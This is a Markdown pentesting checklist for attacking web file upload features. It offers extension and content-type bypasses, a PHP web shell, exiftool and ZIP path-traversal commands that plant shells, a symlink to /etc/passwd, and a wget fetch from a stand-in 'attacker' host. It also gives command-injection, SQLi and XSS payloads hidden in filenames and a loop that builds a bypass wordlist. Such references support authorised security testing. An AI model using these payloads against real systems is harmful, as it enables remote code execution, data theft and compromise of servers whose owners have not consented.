# üóÇÔ∏è File Upload - Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê While testing for file upload vulnerabilities, I realistically expect to:

- [ ] Upload a webshell or executable script for RCE
- [ ] Bypass extension and content-type restrictions
- [ ] Abuse alternate extensions, encodings, or null bytes
- [ ] Poison metadata (e.g. EXIF) to hide payloads
- [ ] Exploit upload location for path traversal, SSRF, XSS, XXE, or DoS
- [ ] Trigger backend decompression to escape upload directories
- [ ] Achieve execution via `.htaccess`, `.phar`, `.phtml`, `.php5`, etc.

---

## ‚úÖ File Upload Attack Checklist

### üîç Extension Bypass

- [ ] Use alternate PHP extensions  
  - `.php`, `.phtml`, `.phps`, `.php5`, `.phar`, `.inc`, `.shtml`

- [ ] Try uppercase and obfuscated versions  
  - `file.PHP`, `file.pHp5`, `file.Phtml`, `file.pHp`, `file.php....`

- [ ] Double extension tricks  
  - `file.jpg.php`, `image.png.phtml`

- [ ] Null byte or encoded tricks  
  - `file.php%00.jpg`, `file.php%20`, `file.php%0a`, `file.php/`

- [ ] Fake extension prepending  
  - `goodfile.png.php`, `pic.jpg.phtml`, `file.asp:.jpg` (NTFS ADS)

- [ ] Long filename to bypass filters  
  - Use 232+ characters and cut `.png` off (e.g. `A‚Ä¶A.php.png`)

---

### üß™ Content-Type & Magic Number Bypass

- [ ] Use generic Content-Types:
  ```
  Content-Type: application/octet-stream
  Content-Type: text/plain
  Content-Type: image/png
  ```

- [ ] Use EXIF metadata for shell:
  ```bash
  exiftool -Comment='<?php system($_POST["cmd"]); ?>' image.jpg
  ```

- [ ] Inject PNG/JPG magic bytes at file start
  ```
  \x89PNG\r\n\x1a\n
  \xff\xd8\xff (JPG)
  ```

---

### ‚öôÔ∏è Execution via Upload

- [ ] Look for misconfigurations that auto-execute `.php` even with `.php.jpg`
- [ ] Check for `.htaccess` or `.config` execution tricks
- [ ] Try uploading `.phar` files that may be interpreted as PHP
- [ ] Upload `.svg`, `.html`, or `.js` for stored XSS
- [ ] Upload `.pdf`, `.pptx`, `.xml` for XXE or SSRF
- [ ] Upload `.zip` containing symlinks or nested paths

---

### üö® Advanced Tricks

- [ ] Rename uploaded file later if renaming is allowed
- [ ] Combine with LFI to execute uploaded shell
- [ ] Try uploading to overwrite important files (`CON`, `NUL`, etc.)
- [ ] Upload `;sleep 10;` as filename to test for command injection
- [ ] Upload `<svg onload=alert(1)>` to test XSS
- [ ] Try ‚Äúpath traversal‚Äù in filename (`../../../etc/passwd`)
- [ ] Use extensions like `.aspx`, `.jsp`, `.cfm`, `.pl` depending on backend

---

### üõ†Ô∏è Server Decompression Abuse

- [ ] **Symlink trick:**
  ```bash
  ln -s /etc/passwd link.txt
  zip --symlinks evil.zip link.txt
  ```

- [ ] **Directory traversal inside ZIP:**
  ```python
  z.writestr('../../../../var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>')
  ```

- [ ] **Use evilarc tool:**
  ```bash
  python evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
  ```

---

### üêö Web Shell Snippet

```php
<?php
if(isset($_REQUEST['cmd'])){
  system($_REQUEST['cmd']);
}
?>
```

---

### üîÑ wget Filename Truncation

- [ ] Create a long filename to bypass extension checks:
  ```bash
  echo "<?php system(\$_GET['cmd']); ?>" > $(python3 -c 'print("A"*232+".php.gif")')
  python3 -m http.server 80
  wget http://attacker/A...A.php.gif
  ```

---

### üìå Polyglot File Tricks

- [ ] `.jpg` + `.php` hybrid (e.g., polyglot GIFAR)
- [ ] PNG with shell in IDAT chunk (ImageTragick bypass)
- [ ] File that is both `.zip` and `.php`
- [ ] `.svg` that acts as SSRF, XSS, or XXE vector

---

### üß® From File Upload to Other Vulns

- [ ] Filename = `../../../tmp/lol.png` ‚Üí Path Traversal
- [ ] Filename = `sleep(10)--.jpg` ‚Üí SQLi
- [ ] Filename = `<svg onload=alert(1)>` ‚Üí Stored XSS
- [ ] Upload SVG/PDF/XML ‚Üí XXE, SSRF, CORS bypass
- [ ] Upload `.js` ‚Üí Service Worker attack
- [ ] Upload EICAR file ‚Üí Test AV filter

---

### üìä Magic Header Signatures

- PNG: `\x89PNG\r\n\x1a\n`
- JPG: `\xff\xd8\xff`

More: https://en.wikipedia.org/wiki/List_of_file_signatures

---

### üîé Useful Tools

- [Upload Scanner - Burp](https://github.com/portswigger/upload-scanner)
- [PayloadsAllTheThings ‚Äì Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [fuxploider](https://github.com/almandin/fuxploider)

---

## üß† Top Things to Try by File Type

| File Type | Potential Impact                      |
|-----------|----------------------------------------|
| `.php`    | Webshell, RCE                         |
| `.svg`    | Stored XSS, XXE, SSRF                 |
| `.gif`    | Stored XSS, SSRF                      |
| `.csv`    | CSV Injection                         |
| `.xml`    | XXE                                   |
| `.avi`    | LFI, SSRF                             |
| `.html`   | XSS, Open Redirect                    |
| `.zip`    | LFI via traversal, DoS                |
| `.pdf`    | Blind XXE, SSRF                       |

---

```c
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '‚Ä¶' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```



